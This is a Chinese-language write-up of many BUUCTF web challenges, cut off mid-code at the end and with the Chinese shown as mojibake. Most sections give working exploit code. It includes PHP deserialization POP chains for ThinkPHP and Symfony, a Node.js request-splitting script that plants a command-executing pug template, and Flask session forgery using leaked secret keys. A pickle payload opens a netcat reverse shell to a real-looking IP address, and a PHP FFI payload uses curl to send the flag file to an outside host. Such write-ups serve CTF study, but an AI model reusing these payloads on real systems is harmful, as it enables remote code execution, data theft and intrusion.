%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000001dae5f69000000005d7b61f7%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D\n```\n\n## [CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1\n\nä»å¤´å¼€å§‹æ‰¾ååºåˆ—åŒ–é“¾å­å‘—\n\n/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.phpä¸­çš„`__destruct`æ–¹æ³•ä¸ºèµ·å§‹ç‚¹ï¼Œè·Ÿè¿›`commit`æ–¹æ³•ï¼Œè·Ÿè¿›`invalidateTags`æ–¹æ³•\n\n```php\nif ($this->deferred) {\n    $items = $this->deferred;\n    foreach ($items as $key => $item) {\n        if (!$this->pool->saveDeferred($item)) {\n            unset($this->deferred[$key]);\n            $ok = false;\n        }\n    }\n\n    $f = $this->getTagsByKey;\n    $tagsByKey = $f($items);\n    $this->deferred = [];\n}\n```\n\næ­¤å¤„è°ƒç”¨äº†poolçš„saveDeferredæ–¹æ³•ï¼Œpoolå¯æ§ï¼Œä½†æ˜¯åœ¨`__construct`ä¸­é™å®šäº†poolçš„ç±»å‹éœ€è¦æ˜¯`AdapterInterface`ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾ä¸€ä¸ªæ˜¯`AdapterInterface`å¹¶ä¸”å¸¦æœ‰`saveDeferred`æ–¹æ³•çš„ç±»ï¼Œçœ‹åˆ°è¿™é‡Œ/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.phpçš„`saveDeferred`ï¼Œä¼ å…¥å˜é‡è¦æ±‚ä¸º`CacheItemInterface`ç±»ï¼Œå…¨å±€æœç´¢è¯¥ç±»\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141634553.png)\n\næ¡ä»¶æ»¡è¶³ç»§ç»­èµ°æ–¹æ³•\n\n```php\nprivate function initialize()\n{\n    if (!file_exists($this->file)) {\n        $this->keys = $this->values = [];\n\n        return;\n    }\n    $values = (include $this->file) ?: [[], []];\n\n    if (2 !== \\count($values) || !isset($values[0], $values[1])) {\n        $this->keys = $this->values = [];\n    } else {\n        list($this->keys, $this->values) = $values;\n    }\n}\n```\n\næ­¤å¤„includeäº†æ–‡ä»¶ï¼Œæœ€ç»ˆçš„æ–‡ä»¶è¯»å–ï¼ŒæŒ‰ç…§ä¸Šè¿°å†…å®¹æ„é€ expï¼Œæ³¨æ„å‘½åç©ºé—´\n\n```php\n<?php\nnamespace Symfony\\Component\\Cache{\n    final class CacheItem{\n    }\n}\n\nnamespace Symfony\\Component\\Cache\\Adapter{\n    use Symfony\\Component\\Cache\\CacheItem;\n    class PhpArrayAdapter{\n        private $file='/flag';\n    }\n    class TagAwareAdapter{\n        private $deferred;\n        private $pool;\n        public function __construct(){\n            $this->deferred = array('xxx' => new CacheItem());\n            $this->pool = new PhpArrayAdapter();\n        }\n    }\n$a=new TagAwareAdapter();\necho urlencode(serialize($a));\n}\n?>\n```\n\n## virink_2019_files_share\n\nçœ‹æºç ï¼Œuploadsæ–‡ä»¶å¤¹ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªæ–‡ä»¶çœ‹å‚æ•°ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ­¤å¤„è¦ç»•ä¸€ä¸‹../ï¼Œå˜æˆ...//\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141718491.png)\n\n## [NESTCTF 2019]Love Math 2\n\nå’ŒLove Mathä¸€æ ·ï¼Œæ„é€ _GETæ¥è‡ªå·±å¡ä¸œè¥¿è¿›å»\n\n```php\n<?php\n$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\nfor($k=1;$k<=sizeof($payload);$k++){\n    for($i = 0;$i < 9; $i++){\n        for($j = 0;$j <=9;$j++){\n            $exp = $payload[$k] ^ $i.$j;\n            echo($payload[$k].\"^$i$j\".\"==>$exp\");\n            echo \"<br />\";\n        }\n    }\n}\n```\n\næœ€ç»ˆpayload\n\n```\n?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag\n```\n\n## [PASECA2019]honey_shop\n\næç¤ºå›¾ç‰‡ç‚¹å‡»å¯ä»¥ä¸‹è½½ï¼Œä»»æ„æ–‡ä»¶è¯»å–\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151413306.png)\n\nè¯»å–åˆ°ç¯å¢ƒå˜é‡ä¸­çš„`SECRET_KEY=Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR`ï¼Œæºç è¯»ä¸åˆ°ä½†æ˜¯çŸ¥é“æ˜¯pythonç¯å¢ƒï¼Œflask-sessionä¼ªé€ \n\n```\npython3 flask_session_cookie_manager3.py encode -s \"ç§é’¥\"  -t \"å†…å®¹\" \npython3 flask_session_cookie_manager3.py encode -s \"Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR\"  -t \"{'balance':114514}\" \n```\n\n## [GYCTF2020]Node Game\n\næºç å–µå–µ\n\n```javascript\nvar express = require('express');\nvar app = express();\nvar fs = require('fs');\nvar path = require('path');\nvar http = require('http');\nvar pug = require('pug');\nvar morgan = require('morgan');\nconst multer = require('multer');\napp.use(multer({dest: './dist'}).array('file'));\napp.use(morgan('short'));\napp.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))\napp.use(\"/template\",express.static(path.join(__dirname, '/template')))\napp.get('/', function(req, res) {\n    var action = req.query.action?req.query.action:\"index\";\n    if( action.includes(\"/\") || action.includes(\"\\\\\") ){//actionå‚æ•°è¿‡æ»¤æ–œæ æ \n        res.send(\"Errrrr, You have been Blocked\");\n    }\n    file = path.join(__dirname + '/template/'+ action +'.pug');\n    var html = pug.renderFile(file);//ç”¨pugå¼•æ“æ¸²æŸ“\n    res.send(html);\n});\napp.post('/file_upload', function(req, res){\n    var ip = req.connection.remoteAddress;//ä¸èƒ½ç”¨X-Forwarded-Forä¼ªé€ \n    var obj = {\n        msg: '',\n    }\n    if (!ip.includes('127.0.0.1')) {\n        obj.msg=\"only admin's ip can use it\"\n        res.send(JSON.stringify(obj));\n        return \n    }\n    fs.readFile(req.files[0].path, function(err, data){\n        if(err){\n            obj.msg = 'upload failed';\n            res.send(JSON.stringify(obj));\n        }else{\n            var file_path = '/uploads/' + req.files[0].mimetype +\"/\";\n          \t//ä»»æ„æ–‡ä»¶ä¸Šä¼ å¹¶ä¸”é€šè¿‡MIMEç±»å‹æ¥ä¿å­˜æ–‡ä»¶ä½ç½®ï¼ŒMIMEå¯æ§æ‰€ä»¥å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Š\n            var file_name = req.files[0].originalname\n            var dir_file = __dirname + file_path + file_name\n            if(!fs.existsSync(__dirname + file_path)){\n                try {\n                    fs.mkdirSync(__dirname + file_path)\n                } catch (error) {\n                    obj.msg = \"file type error\";\n                    res.send(JSON.stringify(obj));\n                    return\n                }\n            }\n            try {\n                fs.writeFileSync(dir_file,data)\n                obj = {\n                    msg: 'upload success',\n                    filename: file_path + file_name\n                } \n            } catch (error) {\n                obj.msg = 'upload failed';\n            }\n            res.send(JSON.stringify(obj));    \n        }\n    })\n})\napp.get('/source', function(req, res) {\n    res.sendFile(path.join(__dirname + '/template/source.txt'));\n});\napp.get('/core', function(req, res) {\n    var q = req.query.q;\n    var resp = \"\";\n    if (q) {\n        var url = 'http://localhost:8081/source?' + q//å¯¹å‚æ•°qè¿›è¡Œå¤„ç†å¹¶è¿›è¡Œæœ¬åœ°è®¿é—®ï¼Œçº¯çº¯SSRF\n        console.log(url)\n        var trigger = blacklist(url);\n        if (trigger === true) {\n            res.send(\"<p>error occurs!</p>\");\n        } else {\n            try {\n                http.get(url, function(resp) {\n                    resp.setEncoding('utf8');\n                    resp.on('error', function(err) {\n                    if (err.code === \"ECONNRESET\") {\n                     console.log(\"Timeout occurs\");\n                     return;\n                    }\n                   });\n\n                    resp.on('data', function(chunk) {\n                        try {\n                         resps = chunk.toString();\n                         res.send(resps);\n                        }catch (e) {\n                           res.send(e.message);\n                        }\n \n                    }).on('error', (e) => {\n                         res.send(e.message);});\n                });\n            } catch (error) {\n                console.log(error);\n            }\n        }\n    } else {\n        res.send(\"search param 'q' missing!\");\n    }\n})\nfunction blacklist(url) {\n    var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"];\n    var arrayLen = evilwords.length;\n    for (var i = 0; i < arrayLen; i++) {\n        const trigger = url.includes(evilwords[i]);\n        if (trigger === true) {\n            return true\n        }\n    }\n}\nvar server = app.listen(8081, function() {\n    var host = server.address().address\n    var port = server.address().port\n    console.log(\"Example app listening at http://%s:%s\", host, port)\n})\n\n```\n\nèƒ½åˆ†æçš„éƒ½å†™åˆ°ä»£ç æ³¨é‡Šé‡Œé¢äº†ï¼Œä¸‹é¢è¦åˆ©ç”¨çš„ä¸€ä¸ªnode.jsæ—©æœŸçš„æ‹†åˆ†æ”»å‡»æ¼æ´ï¼Œå…ˆè´´ä¸€ä¸ªå¤§ä½¬[wp](https://blog.csdn.net/cjdgg/article/details/119068329)\n\næ‹†åˆ†æ”»å‡»ï¼Œæ˜¯æŒ‡åœ¨HTTPè¯·æ±‚å¤´ä¸­ä¼ªé€ å‡º\\r\\nè½¬ä¹‰å­—ç¬¦ï¼Œæ¥ä½¿å¾—HTTPæœåŠ¡å™¨å°†ä¸€ä¸ªè¯·æ±‚å½“ä½œä¸¤ä¸ªæˆ–å¤šä¸ªè¯·æ±‚æ‰§è¡Œï¼Œå½“ç„¶ï¼Œå¤§éƒ¨åˆ†æœåŠ¡å™¨éƒ½è€ƒè™‘åˆ°äº†è¿™ç§æƒ…å†µï¼Œä¼šå°†ä¼ æ¥çš„å†…å®¹è¿›è¡Œè½¬è¯‘ï¼Œnode.jsä¹Ÿä¸ä¾‹å¤–ï¼Œä½†æ˜¯åœ¨node.js 8ç‰ˆæœ¬åŠä»¥å‰ï¼Œnode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ï¼Œå¯¼è‡´å­—ç¬¦ä¼šè¢«æˆªæ–­ï¼Œä½¿å¾—æˆ‘ä»¬éœ€è¦çš„\\r\\nå‡ºç°ï¼Œå…·ä½“å¯è§ä¸‹é¢çš„å†…å®¹\n\n> # HTTPè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå\n>\n> ä¸€åˆ‡éƒ½å¼€å§‹äºæˆ‘è°ƒè¯•çš„ä¸€ä¸ªéå…³è”çš„unicodeå¤„ç†issueï¼Œå¹¶æœ€ç»ˆå°†æˆ‘å¼•å‘ä¸€ä¸ªé”™è¯¯æŠ¥å‘Šï¼š[bug report against the Node.js `http` module](https://github.com/nodejs/node/issues/13296),æŠ¥å‘Šä¸­æåˆ°ï¼š\n>\n> [![img](https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png)\n>\n> æ¢å¥è¯è¯´ï¼ŒæŠ¥å‘Šè€…ä½¿ç”¨Node.jså‘ç‰¹å®šè·¯å¾„å‘å‡ºHTTPè¯·æ±‚ï¼Œä½†æ˜¯å‘å‡ºçš„è¯·æ±‚å®é™…ä¸Šè¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„ï¼æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªé—®é¢˜æ˜¯ç”±Node.jså°†HTTPè¯·æ±‚å†™å…¥è·¯å¾„æ—¶å¯¹unicodeå­—ç¬¦çš„æœ‰æŸç¼–ç å¼•èµ·çš„ã€‚\n>\n> è™½ç„¶ç”¨æˆ·å‘å‡ºçš„`http`è¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ï¼Œä¾‹å¦‚ğŸ¶\n>\n> ç›¸åï¼Œè¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚ï¼š\n> [![img](https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png)\n>\n> å¤„ç†ç”¨æˆ·è¾“å…¥æ—¶çš„åæ•°æ®é€šå¸¸æ˜¯åº•å±‚å®‰å…¨é—®é¢˜çš„å±é™©ä¿¡å·ï¼Œæˆ‘çŸ¥é“æˆ‘ä»¬çš„ä»£ç åº“å‘å‡ºäº†å¯èƒ½åŒ…å«ç”¨æˆ·è¾“å…¥çš„è·¯å¾„çš„HTTPè¯·æ±‚ã€‚æ‰€ä»¥æˆ‘ç«‹å³åœ¨Bugzillaä¸­æäº¤äº†ä¸€ä¸ªä¿å¯†çš„å®‰å…¨æ¼æ´ï¼Œå‘nodeå®‰å…¨å›¢é˜Ÿå¯»æ±‚æ›´å¤šä¿¡æ¯ï¼Œç„¶åæ ¹æ®ç”¨æˆ·æä¾›çš„unicodeå­—ç¬¦ä¸²å¯»æ‰¾æˆ‘ä»¬å¯èƒ½æ„å»ºURLçš„åœ°æ–¹ã€‚\n>\n> å†…å®¹æºè‡ªï¼šhttps://xz.aliyun.com/t/2894\n\nå·ä¸€ä¸ªå¤§ä½¬çš„è„šæœ¬\n\n```python\nimport requests\n\npayload = \"\"\" HTTP/1.1\nHost: 127.0.0.1\nConnection: keep-alive\n\nPOST /file_upload HTTP/1.1\nHost: 127.0.0.1\nContent-Length: {}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt\n\n{}\"\"\".replace('\\n', '\\r\\n')\n\nbody = \"\"\"------WebKitFormBoundarysAs7bV3fMHq0JXUt\nContent-Disposition: form-data; name=\"file\"; filename=\"lmonstergg.pug\"\nContent-Type: ../template\n\n-var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()\")\n-return x\n------WebKitFormBoundarysAs7bV3fMHq0JXUt--\n\n\"\"\".replace('\\n', '\\r\\n')\n\npayload = payload.format(len(body), body) \\\n    .replace('+', '\\u012b')             \\\n    .replace(' ', '\\u0120')             \\\n    .replace('\\r\\n', '\\u010d\\u010a')    \\\n    .replace('\"', '\\u0122')             \\\n    .replace(\"'\", '\\u0a27')             \\\n    .replace('[', '\\u015b')             \\\n    .replace(']', '\\u015d') \\\n    + 'GET' + '\\u0120' + '/'\n\nsession = requests.Session()\nsession.trust_env = False\nresponse1 = session.get('http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/core?q=' + payload)\nresponse = session.get('http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg')\nprint(response.text)\n```\n\n## [watevrCTF-2019]Pickle Store\n\næ˜ç¤ºpickleï¼Œå…ˆè§£ç çœ‹çœ‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151820591.png)\n\nå¾ˆæ˜æ˜¾æœ‰åŠ å¯†éªŒè¯å•Šï¼Œé‚£å°±ä¸èƒ½ä¼ªé€ å†…å®¹äº†ï¼Œåªèƒ½è‡ªå·±æä¸ªç±»åå¼¹shelläº†\n\n```python\nimport base64\nimport pickle\n\nclass A(object):\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('nc 43.249.193.167 38901 -e/bin/sh')\",))\na = A()\nprint(base64.b64encode(pickle.dumps(a)))\n```\n\n## [CISCN2019 åä¸œåŒ—èµ›åŒº]Web2\n\nXSSSSSSSSSSSSSSï¼Œä¸å‡ºç½‘ï¼Œè¿˜æ˜¯ä¹‹åXSSå¹³å°èƒ½ç”¨äº†å†è¯´å§\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [RootersCTF2019]ImgXweb\n\næ³¨å†Œç™»å½•çœ‹åˆ°jwtï¼Œæ‰«ç›®å½•æ‰«å‡ºæ¥å¯†é’¥ï¼Œç›´æ¥ä¼ªé€ adminå°±è¡Œ\n\n## [GWCTF 2019]ä½ çš„åå­—\n\né™¤äº†SSTIè¿˜èƒ½æ˜¯å•¥\n\næµ‹è¯•å‘—ï¼Œè¾“å…¥ä¸ªä¸¤å¯¹èŠ±æ‹¬å·å‘ç°è¢«æ»¤äº†ï¼Œ~~è¿˜çˆ†å‡ºäº†æ˜¯phpç¯å¢ƒï¼Œå…¶å®å¹¶ä¸æ˜¯ï¼Œä¼°è®¡æ˜¯BUUå¤ç°ç¯å¢ƒçš„é—®é¢˜~~\n\næ²¡å…³ç³»è¿˜æœ‰å‘½ä»¤æ‰§è¡Œå¯ç”¨ï¼Œå•¥ç¬¦å·éƒ½æ²¡è¿‡æ»¤ç›´æ¥æ‹¼æ¥å°±è¡Œ\n\n## [BSidesCF 2020]Hurdles\n\nè°¢è°¢è¿™é“é¢˜ï¼Œè®©æˆ‘ç‹ ç‹ äº†è§£äº†ä¸€æŠŠcurlæ€ä¹ˆç”¨\n\n```bash\ncurl -i -X PUT 'http://node4.buuoj.cn:26923/hurdles/!?get=flag&%26%3D%26%3D%26=%2500%0a' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H \"X-Forwarded-For:13.37.13.37,127.0.0.1\" -b \"Fortune=6265\" -H \"Accept:text/plain\" -H \"Accept-Language:ru\" -H \"origin:https://ctf.bsidessf.net\" -H \"referer:https://ctf.bsidessf.net/challenges\"\n```\n\ncurlä½¿ç”¨æ–¹æ³•\n\n```bash\ncurl -o æ–‡ä»¶å é“¾æ¥ #ä¸‹è½½URLå†…å®¹å¹¶é‡å‘½åä¸ºæ–‡ä»¶å\n-O é“¾æ¥ #ä»¥URLç»“å°¾åšæ–‡ä»¶å\n-L #è·Ÿéšé‡å®šå‘è·³è½¬\n-C - -O é“¾æ¥ #ç»§ç»­è¢«ä¸­æ–­çš„ä¸‹è½½\n--trace-ascii æ–‡ä»¶ é“¾æ¥ #å°†æ•´ä¸ªcurlå‘½ä»¤æ‰§è¡Œè¿‡ç¨‹å†™å…¥æ–‡ä»¶\n-X è¯·æ±‚æ–¹å¼ #ä½¿ç”¨æŒ‡å®šçš„è¯·æ±‚æ–¹å¼æ¥å‘èµ·è¯·æ±‚\n-F \"name=@æ–‡ä»¶æœ¬åœ°è·¯å¾„\" #ä¸Šä¼ æ–‡ä»¶\n--data #å¸¦POSTå‚æ•°ï¼Œå¯å¸¦json\n--cookie #æºå¸¦cookie\n--cookie stored_cookies_file_path #è¯»å–cookie\n--user-agent æˆ–è€… -A #å¸¦UAå¤´\n-H #å¸¦è¯·æ±‚å¤´\n--user username:password #é€šè¿‡Basic AuthenticationéªŒè¯\n-i #æ˜¾ç¤ºå®Œæ•´å“åº”\n```\n\n## [HarekazeCTF2019]Easy Notes\n\nä»£ç å®¡è®¡å’ŒSESSIONæ–‡ä»¶ä¼ªé€ \n\nçœ‹æ‹¿flagçš„è¦æ±‚æ˜¯`$SESSION['admin']==true`ï¼Œåœ¨æ–‡ä»¶ä¸‹è½½ä»£ç å¤„å¯çœ‹åˆ°ï¼Œç”Ÿæˆæ–‡ç« æ‰“åŒ…åæ–‡ä»¶å’ŒSESSIONæ–‡ä»¶å­˜å‚¨åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ï¼Œå¯ä»¥è¿›è¡Œä¼ªé€ ï¼Œçœ‹æ–‡ä»¶åå¤„ç†çš„ä»£ç \n\n```php\n$filename = get_user() . '-' . bin2hex(random_bytes(8)) . '.' . $type;\n$filename = str_replace('..', '', $filename); // avoid path traversal\n$path = TEMP_DIR . '/' . $filename;\n```\n\næ­¤å¤„å°†æ–‡ä»¶åå‘½åä¸º`ç”¨æˆ·å-éšæœº8ä½16è¿›åˆ¶æ•°.typeå‚æ•°`ï¼Œå¹¶ä¸”å¦‚æœæœ‰ä¸¤ä¸ª.è¿˜ä¼šå°†å…¶æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ ç”¨æˆ·åä¸º`sess_`ï¼Œtypeä¸º`.`æœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶å°±æ˜¯`sess_-éšæœº8ä½16è¿›åˆ¶æ•°`ï¼Œåˆšå¥½ç¬¦åˆSESSIONæ–‡ä»¶å­˜å‚¨å‘½åï¼Œè€Œåˆå› ä¸ºä¸‹é¢ç”Ÿæˆæ–‡ä»¶ä½¿ç”¨çš„æ˜¯zipæ–¹å¼æ‰“åŒ…ï¼Œæ–‡æœ¬åŸæ ·å†™å…¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ–‡ç« æ ‡é¢˜å¤„æ„é€ `admin|b:1;`å°±èƒ½è¢«é»˜è®¤ååºåˆ—åŒ–æ–¹å¼è·å–ï¼Œè€Œä¸ºäº†é˜²æ­¢å‰åå­—ç¬¦å½±å“ï¼Œæ„é€ æ ‡é¢˜ä¸º`xxxx|N;admin|b:1;xxxxxx`ï¼Œé€šè¿‡ä¸‹è½½è·å–SESSIDï¼Œä¿®æ”¹cookieå³å¯\n\n## [BSidesCF 2019]Pick Tac Toe\n\nçœ‹é¡µé¢ä»£ç ï¼ŒæŒ‰ç…§å¯¹åº”å­—ç¬¦ä¼ å‚å¯è¦†ç›–ç”µè„‘æ­¥æ•°\n\n## [RCTF 2019]Nextphp\n\nç¦ç”¨äº†ä¸€å †å‡½æ•°ï¼Œå¹¶ä¸”å¸¦æœ‰openbase_dirï¼Œé€šè¿‡globåè®®æ‰«å‡ºflagåœ¨æ ¹ç›®å½•ï¼Œç„¶åå½“å‰ç›®å½•è¿˜æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹\n\n```php\n<?php\nfinal class A implements Serializable {\n    protected $data = [\n        'ret' => null,\n        'func' => 'print_r',\n        'arg' => '1'\n    ];\n\n    private function run () {\n        $this->data['ret'] = $this->data['func']($this->data['arg']);\n    }\n\n    public function __serialize(): array {\n        return $this->data;\n    }\n\n    public function __unserialize(array $data) {\n        array_merge($this->data, $data);\n        $this->run();\n    }\n\n    public function serialize (): string {\n        return serialize($this->data);\n    }\n\n    public function unserialize($payload) {\n        $this->data = unserialize($payload);\n        $this->run();\n    }\n\n    public function __get ($key) {\n        return $this->data[$key];\n    }\n\n    public function __set ($key, $value) {\n        throw new \\Exception('No implemented');\n    }\n\n    public function __construct () {\n        throw new \\Exception('No implemented');\n    }\n}\n```\n\næ­¤å¤„åˆ©ç”¨çš„æ˜¯php7.4æ–°å¼•è¿›çš„ä¸€é¡¹ç‰¹æ€§ï¼š[FFIæ‰©å±•è¯¦è§£](https://www.laruence.com/2020/03/11/5475.html)\n\næ€»ä½“çš„FFIè°ƒç”¨é€»è¾‘å°±æ˜¯\n\n```php\n<?php\n\t\t$a=FFI::cdef(Cä¸­çš„å‡½æ•°A(Cä¸­å®šä¹‰å‡½æ•°Açš„å‚æ•°);Cä¸­çš„å‡½æ•°B(Cä¸­å®šä¹‰å‡½æ•°Bçš„å‚æ•°);,\"éœ€è¦åŠ åœ¨çš„åŠ¨æ€åº“\");\n\t\t$a->A(Aå‚æ•°);\n?>\n```\n\né‚£ä¹ˆåœ¨ä¸Šé¢çš„è¿™ä¸ªåºåˆ—åŒ–å†…å®¹ä¸­æˆ‘ä»¬å°±å¯ä»¥åšå¦‚ä¸‹æ„é€ \n\n```php\n<?php\nfinal class A implements Serializable {\n    protected $data = [\n        'ret' => null,\n        'func' => 'FFI::cdef',\n        'arg' => 'int system(char *command);'\n    ];\n    public function serialize (): string {\n        //æ­¤å¤„ä¸¤ä¸ªå‡½æ•°éœ€è¦ä¿ç•™æ˜¯å› ä¸ºSerializableæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶ä¸­çš„å±æ€§ä¸å†æ¬¡ç»è¿‡å£°æ˜æ˜¯ä¸èƒ½è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„\n        return serialize($this->data);\n    }\n    public function unserialize($payload) {\n    }\n}\n$a = new A();\necho serialize($a);\n?>\n```\n\nç”±äºåœ¨ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œrunå‡½æ•°ï¼Œå°†FFIè°ƒç”¨åçš„ç»“æœä¼ ç»™$data->retå˜é‡ï¼Œè¿›è€Œå¯¹retè°ƒç”¨å³å¯è°ƒç”¨Cä¸­çš„systemå‡½æ•°ï¼Œç»•è¿‡phpçš„é™åˆ¶ï¼Œä¸èƒ½ç›´æ¥è®¿é—®dataå› ä¸ºå…¶ä¸ºä¿æŠ¤å±æ€§\n\n```\npayload:?a=$a=unserialize('C:1:\"A\":89:{a:3:{s:3:\"ret\";N;s:4:\"func\";s:9:\"FFI::cdef\";s:3:\"arg\";s:26:\"int system(char *command);\";}}');\n$a-> __serialize()['ret']->system('curl -d @/flag 182.61.46.138:12345');\n```\n\n## [watevrCTF-2019]Supercalc\n\nåˆç†æ€€ç–‘SSTIï¼Œä½†æ˜¯åŒèŠ±æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œè¯•è¯•è®©ç¨‹åºæŠ¥é”™ï¼Œä½¿ç”¨1/0ï¼Œå¾—åˆ°æŠ¥é”™\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162052551.png)\n\né‚£åœ¨åé¢è´´ä¸Šæ³¨é‡Šï¼Œçœ‹çœ‹é‡Œé¢ä¼šä¸ä¼šè¢«æ‰§è¡Œï¼Œä¼ å…¥äº†æ²¡æ‰§è¡Œ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162053572.png)\n\né‚£å†ä¼ å…¥æ¨¡ç‰ˆè¯­æ³•è¯•è¯•ï¼ŒæˆåŠŸçˆ†å‡º`SECRET_KEY`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162055573.png)\n\nå°è¯•ç›´æ¥ä¼ å…¥æç¤ºé•¿åº¦è¿‡é•¿ï¼Œé‚£å°±ä¼ªé€ sessionå§\n\n```bash\npython3 *3.py encode -s \"cded826a1e89925035cc05f0907855f7\" -t '{\"history\":[{\"code\":\"__import__(\\\"os\\\").popen(\\\"cat flag.txt\\\").read()\"}]}'\n```\n\n## [SWPU2019]Web3\n\nä¼ªé€ sessionï¼Œè®¿é—®ä¸ª404çš„ç½‘ç«™ï¼Œå¯ä»¥æ‹¿åˆ°`SECRET_KEY:keyqqqwwweee!@#$%^&*`\n\nIDå¤„base64è§£ç å‘ç°æ˜¯100ï¼Œä¼ªé€ æˆ1è¯•è¯•\n\n```\npython3 *3.py encode -s 'keyqqqwwweee!@#$%^&*' -t '{\"id\":{\"b\":\"1\"},\"is_login\":True,\"password\":\"admin\",\"username\":\"admin\"}' \n```\n\nè¿›å»äº†ï¼Œæœ‰æºç \n\n```python\n@app.route('/upload',methods=['GET','POST'])\ndef upload():\n    if session['id'] != b'1':\n        return render_template_string(temp)\n    if request.method=='POST':\n        m = hashlib.md5()\n        name = session['password']\n        name = name+'qweqweqwe'\n        name = name.encode(encoding='utf-8')\n        m.update(name)\n        md5_one= m.hexdigest()\n        n = hashlib.md5()\n        